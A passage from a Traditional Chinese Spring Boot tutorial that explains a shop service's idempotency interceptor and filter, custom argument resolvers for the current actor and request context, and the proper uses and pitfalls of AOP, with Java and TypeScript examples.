 *   <li>原子性 claim；依結果決定：執行 / 重播 / 409。</li>
 *   <li>把「要記錄結果」的資訊放進 request attribute，讓 Filter 在回應後寫入。</li>
 * </ol>
 */
@Component
public class IdempotencyInterceptor extends OncePerRequestInterceptor {

    private static final Logger log = LoggerFactory.getLogger(IdempotencyInterceptor.class);

    /** Filter 用這些 attribute 決定要不要包裝 / 記錄。 */
    public static final String ATTR_STORE_KEY = "shop.idempotency.storeKey";
    public static final String ATTR_ACTOR_ID = "shop.idempotency.actorId";

    private static final int MAX_KEY_LENGTH = 64;
    private static final int MIN_KEY_LENGTH = 8;

    private final IdempotencyStore store;
    private final ProblemWriter problemWriter;

    public IdempotencyInterceptor(IdempotencyStore store, ProblemWriter problemWriter) {
        this.store = store;
        this.problemWriter = problemWriter;
    }

    @Override
    protected boolean preHandleOnce(HttpServletRequest request, HttpServletResponse response,
                                    Object handler) throws IOException {

        if (!(handler instanceof HandlerMethod handlerMethod)) return true;

        Idempotent annotation = handlerMethod.getMethodAnnotation(Idempotent.class);
        if (annotation == null) return true;                    // 這個端點不需要冪等

        String key = request.getHeader(ApiHeaders.IDEMPOTENCY_KEY);

        // ── 驗證 key ──────────────────────────────────────────
        if (key == null || key.isBlank()) {
            if (!annotation.required()) return true;
            throw new IdempotencyKeyRequiredException();       // → 400（03 章）
        }
        key = key.trim();
        if (key.length() < MIN_KEY_LENGTH || key.length() > MAX_KEY_LENGTH
                || !key.matches("^[A-Za-z0-9_:-]+$")) {
            throw new InvalidIdempotencyKeyException(MIN_KEY_LENGTH, MAX_KEY_LENGTH);
        }

        String actorId = CurrentActorHolder.actorIdOrAnonymous();
        String fingerprint = fingerprintOf(request);

        // ── 原子性 claim ──────────────────────────────────────
        var result = store.claim(key, actorId, fingerprint,
                                 annotation.ttlSeconds(), annotation.leaseSeconds());

        return switch (result) {

            // 第一個請求（或接手過期租約）→ 繼續執行，並請 Filter 記錄結果
            case IdempotencyStore.ClaimResult.Acquired ignored -> {
                request.setAttribute(ATTR_STORE_KEY, key);
                request.setAttribute(ATTR_ACTOR_ID, actorId);
                yield true;
            }

            // 已經有結果 → 重播，不執行 Controller
            case IdempotencyStore.ClaimResult.Replay replay -> {
                writeReplay(replay.record(), response);
                log.info("冪等重播 key={} status={}", key, replay.record().responseStatus());
                yield false;                                   // ★ 4.7.2 的「回 false」
            }

            // 前一個還在執行 → 409 + 輪詢資訊
            case IdempotencyStore.ClaimResult.InProgress inProgress -> {
                long retryAfter = Math.max(1,
                        Duration.between(Instant.now(), inProgress.leaseExpiresAt())
                                .toSeconds());
                problemWriter.write(request, response,
                        ErrorCode.PAYMENT_ALREADY_IN_PROGRESS,
                        "A request with the same Idempotency-Key is still being processed.",
                        Map.of("idempotencyKey", key,
                               "retryAfterSeconds", retryAfter,
                               "statusCheckUrl", request.getRequestURI()));
                yield false;
            }

            // 同 key 不同內容 → 409（客戶端 bug）
            case IdempotencyStore.ClaimResult.FingerprintMismatch mismatch -> {
                log.warn("冪等鍵被用於不同的請求 key={} actorId={}", key, actorId);
                problemWriter.write(request, response,
                        ErrorCode.IDEMPOTENCY_KEY_REUSED,
                        "The Idempotency-Key was previously used with a different request body.",
                        Map.of("idempotencyKey", key,
                               "hint", "為每一次「新的」操作產生一個新的 Idempotency-Key。"
                                       + "重試同一個操作時才重用同一個 key。"));
                yield false;
            }
        };
    }

    /**
     * 請求指紋 = SHA-256(method + '\n' + path + '\n' + normalized(body))。
     *
     * <p>⚠️ 三個規範化決策：
     * <ul>
     *   <li>**含 path**：同一個 key 用在不同端點應該被視為不同請求。</li>
     *   <li>**不含 query string**：`?_t=123`（快取破壞）不該讓指紋改變。
     *       ⚠️ 但如果你的端點靠 query 參數決定行為，就必須包含它。</li>
     *   <li>**body 用原始 bytes**：不做 JSON 正規化。
     *       意思是「欄位順序不同」會產生不同指紋 → 保守但安全。
     *       （03-rest-api 8.2 討論過正規化的取捨。）</li>
     * </ul>
     */
    private String fingerprintOf(HttpServletRequest request) {
        byte[] body = (request instanceof CachedBodyRequestWrapper cached)
                ? cached.cachedBody()
                : new byte[0];

        // ⚠️ body 被截斷時不能算指紋（會把兩個不同的請求視為相同）
        if (request instanceof CachedBodyRequestWrapper cached && cached.isTruncated()) {
            throw new IdempotencyBodyTooLargeException();
        }

        try {
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            digest.update(request.getMethod().getBytes(StandardCharsets.UTF_8));
            digest.update((byte) '\n');
            digest.update(request.getRequestURI().getBytes(StandardCharsets.UTF_8));
            digest.update((byte) '\n');
            digest.update(body);
            return HexFormat.of().formatHex(digest.digest());
        } catch (NoSuchAlgorithmException e) {
            throw new IllegalStateException("SHA-256 不可用", e);
        }
    }

    /** 把先前的回應寫回去。 */
    private void writeReplay(IdempotencyStore.Record record, HttpServletResponse response)
            throws IOException {
        if (response.isCommitted()) {
            log.warn("回應已 committed，無法重播冪等結果 key={}", record.key());
            return;
        }
        response.reset();
        response.setStatus(record.responseStatus());
        record.responseHeaders().forEach(response::setHeader);
        // ★ 明確標記這是重播 —— 對除錯與客戶端都有價值
        response.setHeader("Idempotent-Replay", "true");
        response.setHeader("Cache-Control", "no-store");
        if (record.responseBody() != null) {
            response.getOutputStream().write(record.responseBody());
        }
    }
}
```

**`Idempotent-Replay: true` header 的價值** ★：

```typescript
// 前端可以知道「這是重播，不要再顯示動畫」
if (response.headers.get('Idempotent-Replay') === 'true') {
  // 這次沒有真的建立訂單，只是拿回先前的結果
  console.debug('idempotent replay');
}
```

**而且它讓測試變得容易**：

```java
@Test
void 重複送同一個冪等鍵不會重複建立() throws Exception {
    String key = "idem-test-0001";
    String body = VALID_ORDER_JSON;

    mockMvc.perform(post("/orders").header("Idempotency-Key", key)
                    .contentType(APPLICATION_JSON).content(body))
            .andExpect(status().isCreated())
            .andExpect(header().doesNotExist("Idempotent-Replay"));

    mockMvc.perform(post("/orders").header("Idempotency-Key", key)
                    .contentType(APPLICATION_JSON).content(body))
            .andExpect(status().isCreated())                    // ★ 同樣的 201
            .andExpect(header().string("Idempotent-Replay", "true"));

    verify(orderService, times(1)).create(any());              // ★ 只執行一次
}
```

### 4.9.5 `IdempotencyFilter`：記錄結果

```java
package example.shop.common.web.idempotency;

import jakarta.servlet.FilterChain;
import jakarta.servlet.ServletException;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.core.annotation.Order;
import org.springframework.http.HttpHeaders;
import org.springframework.stereotype.Component;
import org.springframework.web.filter.OncePerRequestFilter;
import org.springframework.web.util.ContentCachingResponseWrapper;

import java.io.IOException;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;

/**
 * 捕捉回應並存進 {@link IdempotencyStore}，讓後續的重複請求能重播。
 *
 * <p>order = -99：Security（-100）之後，因為冪等鍵的範圍是 per-actor。
 *
 * <p>⚠️ 這個 filter 「一律」包裝 response（除了串流端點），
 * 因為它在 Interceptor 之前執行，無法知道端點有沒有 {@code @Idempotent}。
 * 包裝的成本是「回應進記憶體」—— 對 JSON 回應（幾 KB）可以接受，
 * 對串流回應（幾百 MB）不行，所以要排除。
 */
@Component
@Order(-99)
public class IdempotencyFilter extends OncePerRequestFilter {

    private static final Logger log = LoggerFactory.getLogger(IdempotencyFilter.class);

    /** 只有這些方法需要冪等。 */
    private static final Set<String> UNSAFE_METHODS = Set.of("POST", "PUT", "PATCH", "DELETE");

    /** 存進紀錄的 header 白名單（不要存 Set-Cookie、Authorization 之類的）。 */
    private static final List<String> STORED_HEADERS = List.of(
            HttpHeaders.CONTENT_TYPE, HttpHeaders.LOCATION, HttpHeaders.ETAG);

    /** 回應大小上限；超過就不存（重播的價值不值得那個記憶體）。 */
    private static final int MAX_STORED_BODY = 64 * 1024;

    private final IdempotencyStore store;

    public IdempotencyFilter(IdempotencyStore store) {
        this.store = store;
    }

    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response,
                                    FilterChain chain) throws ServletException, IOException {

        var wrapper = new ContentCachingResponseWrapper(response);
        try {
            chain.doFilter(request, wrapper);
        } finally {
            try {
                storeIfNeeded(request, wrapper);
            } catch (Exception e) {
                // ★ 記錄失敗不能影響回應。代價是「重播會失效」，可接受
                log.warn("冪等結果寫入失敗: {}", e.getMessage());
            }
            // ★★★ 一定要在 finally（4.4.6）
            wrapper.copyBodyToResponse();
        }
    }

    private void storeIfNeeded(HttpServletRequest request,
                               ContentCachingResponseWrapper wrapper) {
        // Interceptor 只在「取得執行權」時設這兩個 attribute
        Object key = request.getAttribute(IdempotencyInterceptor.ATTR_STORE_KEY);
        Object actorId = request.getAttribute(IdempotencyInterceptor.ATTR_ACTOR_ID);
        if (key == null || actorId == null) return;

        int status = wrapper.getStatus();

        // ★ 5xx 不存 —— 那代表失敗，客戶端「應該」能重試
        if (status >= 500) {
            store.release(key.toString(), actorId.toString());
            return;
        }
        // ★ 429 也不存（限流是暫時的）
        if (status == 429) {
            store.release(key.toString(), actorId.toString());
            return;
        }

        byte[] body = wrapper.getContentAsByteArray();
        if (body.length > MAX_STORED_BODY) {
            log.info("回應過大（{} bytes），不記錄冪等結果 key={}", body.length, key);
            store.release(key.toString(), actorId.toString());
            return;
        }

        Map<String, String> headers = new LinkedHashMap<>();
        for (String name : STORED_HEADERS) {
            String value = wrapper.getHeader(name);
            if (value != null) headers.put(name, value);
        }

        store.complete(key.toString(), actorId.toString(), status, headers, body);
    }

    @Override
    protected boolean shouldNotFilter(HttpServletRequest request) {
        if (!UNSAFE_METHODS.contains(request.getMethod())) return true;

        // ★ 串流端點不可包裝 response（4.4.6 的 OOM 風險）
        String path = request.getRequestURI();
        return path.endsWith("/events")
            || path.endsWith("/file")
            || path.contains("/download")
            || path.startsWith("/actuator");
    }
}
```

⚠️ **「4xx 要不要存」是一個需要決定的問題。**

| 狀態碼 | 存嗎 | 理由 |
|---|---|---|
| 2xx | ✅ 存 | 成功的結果要能重播 |
| 422（驗證失敗） | ✅ 存 | 同樣的請求會得到同樣的驗證錯誤，重播是正確的 |
| 409（業務衝突） | ✅ 存 | 同上 |
| 429（限流） | ❌ 不存 | 限流是**暫時**的，客戶端稍後重試應該要能成功 |
| 5xx | ❌ 不存 | 失敗應該可以重試 |

⚠️ **5xx 不存 + `release()` 的組合有一個風險**：
如果 Service 已經有部分副作用（例如已經呼叫了金流商但寫資料庫失敗），
釋放 key 會讓客戶端重試 → **重複扣款**。

**這就是為什麼「冪等」不能只靠這一層。**
真正的保護需要 Service 層的「先寫入 PENDING 紀錄再呼叫外部」
（03 章練習 2 的 `PaymentOutcomeUnknownException` 就是這個模式）。

> **這一層是「便宜的第一道防線」，不是唯一的防線。**
> 03-rest-api 第 09 章「每一層都是別人的安全網」的同一個原則。

### 4.9.6 套用到 Controller

```java
@RestController
@RequestMapping(path = "/orders", produces = MediaType.APPLICATION_JSON_VALUE)
public class OrderController {

    @PostMapping(consumes = MediaType.APPLICATION_JSON_VALUE)
    @Idempotent(ttlSeconds = 86_400, leaseSeconds = 60)         // ★ 一個註解
    public ResponseEntity<CreateOrderResponse> create(
            @Valid @RequestBody CreateOrderRequest request,
            @RequestHeader(ApiHeaders.IDEMPOTENCY_KEY) @Size(max = 64) String idempotencyKey,
            @CurrentActor Actor actor) {
        // ★ Controller 完全不知道冪等機制的存在
        var result = orderService.create(mapper.toCreateCommand(request, actor, idempotencyKey));
        ...
    }
}
```

**「不動 83 個端點就加上冪等保護」達成了。**
需要保護的端點加一個 `@Idempotent`，其他完全不變。

⚠️ **`idempotencyKey` 參數還留著嗎？** 兩種選擇：

| 做法 | 取捨 |
|---|---|
| **保留參數** | Service 可以拿到它（例如寫進訂單紀錄方便對帳）✅<br>但參數列變長 |
| **移除參數** | Controller 更乾淨<br>Service 拿不到 key |

**shop-service 保留**，因為訂單紀錄要存 `idempotency_key` 欄位供財務對帳。

### 4.9.7 客戶端該怎麼產生 key

**這是文件必須寫清楚的事**，否則客戶端會用錯。

```typescript
// ✅ 正確：一個「使用者意圖」對應一個 key
function useCheckout() {
  // ★ 在「進入結帳頁」時產生，而不是在「送出請求」時
  const [idempotencyKey] = useState(() => crypto.randomUUID());

  async function submit() {
    return await api.post('/orders', body, {
      headers: { 'Idempotency-Key': idempotencyKey },
    });
  }
  // 使用者按第二次 → 同一個 key → 安全
  // 使用者改了購物車重新進結帳 → 新的 key
}
```

```typescript
// ❌ 錯誤 1：每次送出都產生新的 key → 冪等完全失效
async function submit() {
  return await api.post('/orders', body, {
    headers: { 'Idempotency-Key': crypto.randomUUID() },   // ← 每次都不同
  });
}

// ❌ 錯誤 2：整個 session 用同一個 key → 第二筆訂單會被重播成第一筆
const SESSION_KEY = crypto.randomUUID();
```

**錯誤 2 的症狀特別詭異**：使用者下第二張訂單，
拿到的卻是第一張訂單的 `orderId`。
**如果 body 不同會被 `FingerprintMismatch` 擋掉（409），
但如果 body 剛好相同（買同樣的東西）就會靜默重播。**

**這是「同一個 key 只該對應一個意圖」的實際後果。**

⚠️ **所以 4.9.4 的 `FingerprintMismatch` 的錯誤訊息裡有一段 `hint`** ——
它是給客戶端工程師看的，而那個提示能省下好幾小時的困惑。

---

## 4.10 `HandlerMethodArgumentResolver`

### 4.10.1 目標

現在 Controller 的簽章長這樣：

```java
public ResponseEntity<CreateOrderResponse> create(
        @Valid @RequestBody CreateOrderRequest request,
        @RequestHeader(ApiHeaders.IDEMPOTENCY_KEY) String idempotencyKey,
        @AuthenticationPrincipal CurrentUser user) {
    var actor = user.actor();       // ← 每個方法都要這一行
    ...
}
```

**想要的是**：

```java
public ResponseEntity<CreateOrderResponse> create(
        @Valid @RequestBody CreateOrderRequest request,
        @RequestHeader(ApiHeaders.IDEMPOTENCY_KEY) String idempotencyKey,
        @CurrentActor Actor actor) {                      // ★ 直接拿到領域型別
    ...
}
```

**為什麼值得做？**

| 好處 | 說明 |
|---|---|
| Controller 不認識 Security 的型別 | `CurrentUser` 是 Security 的概念；`Actor` 是領域概念 |
| 少一行樣板 | × 83 個方法 |
| 測試更容易 | 測試不需要建立 `CurrentUser`，直接給 `Actor` |
| **編譯期保證** | `Actor` 是 `record`，不可能是 `null`（resolver 保證） |

### 4.10.2 實作

```java
package example.shop.common.web;

import java.lang.annotation.*;

/** 注入目前操作者。由 {@link CurrentActorArgumentResolver} 解析。 */
@Documented
@Target(ElementType.PARAMETER)
@Retention(RetentionPolicy.RUNTIME)
public @interface CurrentActor {
    /** 未認證時是否允許（true = 注入匿名 Actor；false = 拋 401）。 */
    boolean allowAnonymous() default false;
}
```

```java
package example.shop.order.domain;

/**
 * 操作者。領域概念，不認識 HTTP 或 Spring Security。
 *
 * <p>⚠️ <b>它的套件位置是一個誠實的妥協，值得說清楚</b>（00 章 0.4 的分層規則）：
 *
 * <p>它被放在 {@code order.domain}，因為它是一個領域概念。
 * <b>但 {@code common.web} 的基礎設施會用到它</b> ——
 * {@code CurrentActorArgumentResolver}、{@code ActorMdcInterceptor}、
 * {@code AuditEvent} 都要它。
 * 也就是說 <b>{@code common} 依賴了 {@code order}</b>，而那是反方向的。
 *
 * <p><b>三個選項與取捨</b>：
 *
 * <table>
 *   <tr><th>選項</th><th>後果</th></tr>
 *   <tr><td>A. 留在 {@code order.domain}（現在）</td>
 *       <td>單一 Maven module 時完全能編譯；⚠️ 但拆 module 的那一天會斷</td></tr>
 *   <tr><td>B. 搬到 {@code common.domain}</td>
 *       <td>✅ 分層乾淨；⚠️ 「common 裡有領域型別」需要一個約定
 *           （common.domain 只放「跨模組共用的領域概念」）</td></tr>
 *   <tr><td>C. 在 {@code common} 定義介面、{@code order} 實作</td>
 *       <td>🔴 過度設計 —— {@code Actor} 只有三個欄位，沒有多型的需要</td></tr>
 * </table>
 *
 * <p>★ <b>shop-service 選 A，但把這件事寫下來</b>：
 * 一旦真的拆成多 module（05-service 之後會評估），第一步就是把 {@code Actor}
 * 與 {@code ActorType} 搬到 {@code common.domain}。
 *
 * <p>⚠️ 而在那之前，<b>所有 import 都必須寫 {@code example.shop.order.domain.Actor}</b>。
 * 寫成 {@code common.web.Actor} 是編譯不過的 ——
 * 而那個錯誤在文件與設計稿裡沒有編譯器會抓（05 章 5.12.4 的符號檢查就是為此存在）。
 */
public record Actor(ActorType type, String id, String displayName) {

    public static final Actor ANONYMOUS =
            new Actor(ActorType.ANONYMOUS, "anonymous", "訪客");

    public Actor {
        if (type == null) throw new IllegalArgumentException("actor type 不可為 null");
        if (id == null || id.isBlank()) throw new IllegalArgumentException("actor id 不可為空");
    }

    public boolean isCustomer() { return type == ActorType.CUSTOMER; }
    public boolean isSupport()  { return type == ActorType.SUPPORT; }
    public boolean isInternal() { return type == ActorType.SUPPORT
                                      || type == ActorType.WAREHOUSE
                                      || type == ActorType.ADMIN; }

    public enum ActorType { ANONYMOUS, CUSTOMER, SUPPORT, WAREHOUSE, ADMIN, SYSTEM }
}
```

```java
package example.shop.common.web;

import example.shop.common.error.AuthenticationRequiredException;
import example.shop.order.domain.Actor;
import org.springframework.core.MethodParameter;
import org.springframework.security.authentication.AnonymousAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.stereotype.Component;
import org.springframework.web.bind.support.WebDataBinderFactory;
import org.springframework.web.context.request.NativeWebRequest;
import org.springframework.web.method.support.HandlerMethodArgumentResolver;
import org.springframework.web.method.support.ModelAndViewContainer;

/**
 * 解析 {@code @CurrentActor Actor} 參數。
 *
 * <p>⚠️ 為什麼不直接用 {@code @AuthenticationPrincipal}？
 * 因為那會讓 Controller 的方法簽章出現 Security 的型別（{@code CurrentUser}），
 * 而 Controller 應該只認識領域型別（第 00 章 0.4.2）。
 * 這個 resolver 是「Security 型別 → 領域型別」的翻譯層。
 */
@Component
public class CurrentActorArgumentResolver implements HandlerMethodArgumentResolver {

    @Override
    public boolean supportsParameter(MethodParameter parameter) {
        return parameter.hasParameterAnnotation(CurrentActor.class)
                && Actor.class.isAssignableFrom(parameter.getParameterType());
    }

    @Override
    public Object resolveArgument(MethodParameter parameter,
                                  ModelAndViewContainer mavContainer,
                                  NativeWebRequest webRequest,
                                  WebDataBinderFactory binderFactory) {

        CurrentActor annotation = parameter.getParameterAnnotation(CurrentActor.class);
        boolean allowAnonymous = (annotation != null) && annotation.allowAnonymous();

        Authentication auth = SecurityContextHolder.getContext().getAuthentication();

        boolean authenticated = auth != null && auth.isAuthenticated()
                && !(auth instanceof AnonymousAuthenticationToken);

        if (!authenticated) {
            if (allowAnonymous) return Actor.ANONYMOUS;
            // ★ 拋例外 → 進 advice → 401（03 章 3.4.2 的 AUTHENTICATION_REQUIRED）
            throw new AuthenticationRequiredException();
        }

        if (auth.getPrincipal() instanceof CurrentUser user) {
            return user.actor();
        }

        // ⚠️ 走到這裡代表 Security 的設定與這個 resolver 不同步 —— 這是設定錯誤，不是使用者的錯
        throw new IllegalStateException(
                "無法從 Authentication 取得 Actor，principal 型別=" 
                        + auth.getPrincipal().getClass().getName());
    }
}
```

```java
@Configuration
public class WebMvcConfig implements WebMvcConfigurer {

    private final CurrentActorArgumentResolver currentActorResolver;
    private final RequestContextArgumentResolver requestContextResolver;

    // 建構子…

    @Override
    public void addArgumentResolvers(List<HandlerMethodArgumentResolver> resolvers) {
        resolvers.add(currentActorResolver);
        resolvers.add(requestContextResolver);
    }
}
```

⚠️ **`addArgumentResolvers` 加的 resolver 排在「內建 resolver 之後」。**

這代表：如果你的 resolver 和內建的衝突（例如你也想處理 `String` 型別的參數），
**內建的會先贏**。

**要插在最前面必須自己操作 `RequestMappingHandlerAdapter`**：

```java
@Bean
BeanPostProcessor argumentResolverPriorityProcessor(
        CurrentActorArgumentResolver custom) {
    return new BeanPostProcessor() {
        @Override
        public Object postProcessAfterInitialization(Object bean, String beanName) {
            if (bean instanceof RequestMappingHandlerAdapter adapter) {
                var existing = adapter.getArgumentResolvers();
                var reordered = new ArrayList<HandlerMethodArgumentResolver>();
                reordered.add(custom);                    // ★ 插在最前面
                reordered.addAll(existing);
                adapter.setArgumentResolvers(reordered);
            }
            return bean;
        }
    };
}
```

⚠️ **這是進階手法，會讓行為變得難以預測。** shop-service 用 `@CurrentActor` 註解，
不會和任何內建 resolver 衝突，**所以不需要這個**。

### 4.10.3 `RequestContext`：把散落的 HTTP 資訊收攏

第 00 章 0.6.9 說「不要把 `HttpServletRequest` 往下傳」，
但 Service 有時確實需要一些請求資訊（IP、User-Agent 用於稽核）。

```java
package example.shop.common.web;

import example.shop.order.domain.Actor;

import java.time.Instant;

/**
 * 一個請求的上下文。這是 {@code HttpServletRequest} 的「領域化」版本 ——
 * Service 可以安全地依賴它（第 00 章 0.6.9）。
 */
public record RequestContext(
    String traceId,
    Actor actor,
    String clientIp,
    String userAgent,
    Instant receivedAt
) {
    public RequestContext {
        if (traceId == null || traceId.isBlank()) traceId = "unknown";
        if (actor == null) actor = Actor.ANONYMOUS;
        if (clientIp == null) clientIp = "unknown";
        userAgent = truncate(userAgent, 200);            // ★ User-Agent 可以很長
        if (receivedAt == null) receivedAt = Instant.now();
    }

    private static String truncate(String s, int max) {
        if (s == null) return null;
        return (s.length() <= max) ? s : s.substring(0, max);
    }
}
```

```java
package example.shop.common.web;

import example.shop.order.domain.Actor;
import org.springframework.core.MethodParameter;
import org.springframework.stereotype.Component;
import org.springframework.web.bind.support.WebDataBinderFactory;
import org.springframework.web.context.request.NativeWebRequest;
import org.springframework.web.method.support.HandlerMethodArgumentResolver;
import org.springframework.web.method.support.ModelAndViewContainer;

import jakarta.servlet.http.HttpServletRequest;
import java.time.Instant;

@Component
public class RequestContextArgumentResolver implements HandlerMethodArgumentResolver {

    private final ClientIpResolver clientIpResolver;

    public RequestContextArgumentResolver(ClientIpResolver clientIpResolver) {
        this.clientIpResolver = clientIpResolver;
    }

    @Override
    public boolean supportsParameter(MethodParameter parameter) {
        return RequestContext.class.equals(parameter.getParameterType());
    }

    @Override
    public Object resolveArgument(MethodParameter parameter,
                                  ModelAndViewContainer mavContainer,
                                  NativeWebRequest webRequest,
                                  WebDataBinderFactory binderFactory) {

        HttpServletRequest request = webRequest.getNativeRequest(HttpServletRequest.class);

        Actor actor = Actor.ANONYMOUS;
        var auth = org.springframework.security.core.context.SecurityContextHolder
                .getContext().getAuthentication();
        if (auth != null && auth.getPrincipal() instanceof CurrentUser user) {
            actor = user.actor();
        }

        return new RequestContext(
                TraceContext.current(),
                actor,
                (request == null) ? "unknown" : clientIpResolver.resolve(request),
                (request == null) ? null : request.getHeader("User-Agent"),
                Instant.now());
    }
}
```

**用法**：

```java
@PatchMapping("/{orderId}/shipping-address")
@PreAuthorize("hasRole('SUPPORT')")
public ShippingAddressChangeResponse update(
        @PathVariable("orderId") @Size(max = 64) String orderId,
        @Valid @RequestBody UpdateShippingAddressRequest request,
        RequestContext context) {                         // ★ 不需要註解（型別就夠了）

    // Service 拿到的是領域型別，稽核紀錄能記下 IP 與 UA
    return mapper.toResponse(orderService.changeShippingAddress(
            mapper.toCommand(orderId, request, context)));
}
```

⚠️ **`RequestContext` 不需要註解**，因為它的型別是唯一的。
但這也是一個風險：如果將來有人在 Controller 方法裡宣告一個同名但不同套件的 `RequestContext`，
會拿到意外的結果。**加註解更明確，但參數列更長 —— 這是風格選擇。**

### 4.10.4 與 `@AuthenticationPrincipal` 的關係

`@AuthenticationPrincipal` **本身就是一個 `HandlerMethodArgumentResolver`**
（`AuthenticationPrincipalArgumentResolver`，Spring Security 提供）。

**所以我們的 `@CurrentActor` 和它是同一個機制，只是多了一層翻譯。**

| | `@AuthenticationPrincipal CurrentUser` | `@CurrentActor Actor` |
|---|---|---|
| 型別來自 | Security 層 | 領域層 ✅ |
| 未認證時 | `null`（要自己檢查） | 拋 401 或給 `ANONYMOUS` ✅ |
| 測試要準備 | `SecurityContext` + `CurrentUser` | 同樣要，但 mock 更小 |
| 額外程式碼 | 0 | 1 個註解 + 1 個 resolver（約 60 行） |

**「未認證時是 `null`」是 `@AuthenticationPrincipal` 最大的問題**：

```java
public ... create(@AuthenticationPrincipal CurrentUser user) {
    var actor = user.actor();          // ← 未認證時 NPE → 500
}
```

**應該是 401，卻變成 500。** 而且它只在「Security 設定漏了這條路徑」時發生 ——
也就是**最需要正確回應的時候**。

`@CurrentActor` 用 `allowAnonymous()` 把這件事變成**顯式的決定**：

```java
// 明確允許未登入（例如公開的商品列表要記錄瀏覽）
public ... list(@CurrentActor(allowAnonymous = true) Actor actor) { }

// 預設不允許 → 未認證直接 401，不會 NPE
public ... create(@CurrentActor Actor actor) { }
```

---

## 4.11 AOP：什麼時候才用

### 4.11.1 AOP 在 Web 層幾乎沒有用途

**因為 Filter / Interceptor / ArgumentResolver 已經覆蓋了所有 Web 層的需求，
而且它們不需要 proxy。**

```java
// ❌ 用 AOP 做請求日誌
@Around("@within(org.springframework.web.bind.annotation.RestController)")
public Object logRequest(ProceedingJoinPoint pjp) throws Throwable { ... }
```

**四個問題**：

| 問題 | 說明 |
|---|---|
| 拿不到 HTTP 細節 | 狀態碼、header 要靠 `RequestContextHolder` 繞著拿 |
| 涵蓋不到 404 / 401 | 那些請求沒有進到 Controller 方法 |
| 需要 proxy | 每個 Controller 多一層代理，stack trace 變長 |
| self-invocation 問題 | Controller 內部呼叫自己的方法時，AOP 不生效 |

### 4.11.2 AOP 的正當用途：Service 層

```java
package example.shop.common.observability;

import io.micrometer.core.instrument.MeterRegistry;
import io.micrometer.core.instrument.Timer;
import org.aspectj.lang.ProceedingJoinPoint;
import org.aspectj.lang.annotation.Around;
import org.aspectj.lang.annotation.Aspect;
import org.springframework.stereotype.Component;

import java.util.concurrent.TimeUnit;

/**
 * Service 方法的耗時統計。
 *
 * <p>★ 這是 AOP 的正當用途：它作用在 Service 層，
 * 而 Filter / Interceptor 只能作用在 Web 層（4.3.1 的最後一列）。
 */
@Aspect
@Component
public class ServiceTimingAspect {

    private static final org.slf4j.Logger log =
            org.slf4j.LoggerFactory.getLogger(ServiceTimingAspect.class);

    private final MeterRegistry meterRegistry;

    public ServiceTimingAspect(MeterRegistry meterRegistry) {
        this.meterRegistry = meterRegistry;
    }

    @Around("execution(public * example.shop..service.*ServiceImpl.*(..))")
    public Object timeServiceMethod(ProceedingJoinPoint pjp) throws Throwable {
        long start = System.nanoTime();
        String outcome = "SUCCESS";
        try {
            return pjp.proceed();
        } catch (example.shop.common.error.BusinessException e) {
            outcome = "BUSINESS_ERROR";           // ★ 業務失敗不算「錯誤」
            throw e;
        } catch (Throwable t) {
            outcome = "ERROR";
            throw t;
        } finally {
            // ★ finally 裡一律包 try-catch（4.11.3 陷阱 3）
            try {
                Timer.builder("shop.service.duration")
                        .tag("class", pjp.getSignature().getDeclaringType().getSimpleName())
                        .tag("method", pjp.getSignature().getName())
                        .tag("outcome", outcome)
                        .register(meterRegistry)
                        .record(System.nanoTime() - start, TimeUnit.NANOSECONDS);
            } catch (Exception metricFailure) {
                log.debug("指標記錄失敗: {}", metricFailure.getMessage());
            }
        }
    }
}
```

⚠️ **`execution(...)` 的 pointcut 字串很脆弱** —— 套件改名就靜默失效。

**更穩的做法是用註解**：

```java
@Around("@annotation(io.micrometer.core.annotation.Timed)")
```

或者根本不寫 aspect —— **Micrometer 有內建的 `TimedAspect`**：

```java
@Bean
io.micrometer.core.aop.TimedAspect timedAspect(MeterRegistry registry) {
    return new io.micrometer.core.aop.TimedAspect(registry);
}
```

```java
@Service
public class OrderServiceImpl implements OrderService {

    @Timed(value = "shop.order.create", description = "建立訂單的耗時")
    @Override
    public CreateOrderResult create(CreateOrderCommand command) { ... }
}
```

**shop-service 用 `TimedAspect` + `@Timed`**，理由：
- 不用維護 pointcut 字串。
- **明確**：看方法就知道它有被計時。
- 少一個自己寫的 aspect。

⚠️ **代價**：每個要計時的方法都要加註解（而不是自動全套用）。
**這是好事** —— 「全部方法都計時」會產生大量沒人看的指標（03 章 3.12.3 的基數問題）。

### 4.11.3 AOP 的三個陷阱

**陷阱 1：self-invocation 不生效**

```java
@Service
public class OrderServiceImpl {

    public void createBatch(List<CreateOrderCommand> commands) {
        for (var cmd : commands) {
            this.create(cmd);       // ❌ 直接呼叫 → 不經過 proxy → @Transactional 失效
        }
    }

    @Transactional
    public Order create(CreateOrderCommand cmd) { ... }
}
```

**因為 Spring AOP 是 proxy 模式** —— 外部呼叫走 proxy，
內部的 `this.create()` 是普通的方法呼叫。

（05-service 第 02 章會完整討論這個，包含三種解法。）

**陷阱 2：`final` 方法／類別無法被代理**

```java
@Service
public final class OrderServiceImpl { }      // ❌ CGLIB 無法繼承
```

```
org.springframework.aop.framework.AopConfigException:
Could not generate CGLIB subclass of class example.shop.OrderServiceImpl:
Common causes of this problem include using a final class
```

⚠️ **`record` 也是 `final`** —— 所以 `record` 不能被 AOP 代理。
（這通常不是問題，因為 record 是資料而不是服務。）

**陷阱 3：aspect 的 `finally` 拋例外會取代原本的例外**

```java
@Around(...)
public Object around(ProceedingJoinPoint pjp) throws Throwable {
    try {
        return pjp.proceed();
    } finally {
        meterRegistry.counter("x").increment();     // ← 如果這裡拋例外？
    }
}
```

`finally` 裡拋的例外會**取代**原本的例外（Java 的語意）。
於是 `InsufficientStockException` 變成 `NullPointerException` → **409 變成 500**。

⚠️ **這條規則適用於所有 `finally`**：Filter、Interceptor 的 `afterCompletion`、
aspect —— 只要是「一定會執行的清理程式碼」，就不能讓它拋例外。

**shop-service 的規則：所有 `finally` 區塊裡的「非必要操作」都要包 try-catch。**
「必要操作」（例如 `MDC.remove`、`copyBodyToResponse`）不包，
因為它們失敗代表更嚴重的問題。

---

## 4.12 非同步請求的生命週期

### 4.12.1 三種非同步回傳的差異

